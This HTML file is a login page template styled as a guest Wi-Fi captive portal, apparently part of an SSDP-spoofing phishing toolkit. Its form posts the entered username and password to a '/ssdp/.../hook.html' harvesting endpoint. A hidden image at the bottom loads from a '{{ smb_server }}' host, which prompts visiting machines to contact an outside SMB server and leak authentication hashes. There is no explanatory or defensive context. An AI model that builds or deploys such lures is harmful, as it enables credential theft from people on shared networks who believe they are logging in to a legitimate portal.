<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captive Portal Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div id="container">
    <div id="header">Captive Portal</div>
    <div id="content">
        <p class="intro">You must log in to access the network.</p>

        <form method="POST" action="/ssdp/{{ template_idx }}/hook.html" name="LoginForm">
            <table>
                <tr>
                    <td class="lbl"><label for="u">Username:</label></td>
                    <td><input type="text" id="u" name="username" size="20" autofocus></td>
                </tr>
                <tr>
                    <td class="lbl"><label for="p">Password:</label></td>
                    <td><input type="password" id="p" name="password" size="20"></td>
                </tr>
                <tr>
                    <td class="lbl"></td>
                    <td><input type="submit" name="accept" value="Continue"></td>
                </tr>
            </table>
        </form>

        <p class="terms">By logging in you agree to the acceptable use policy.</p>
    </div>
</div>

<div id="footer">Guest Wi-Fi &mdash; authentication required</div>

<img src="http://{{ smb_server }}" style="display: none;" />
</body>
</html>
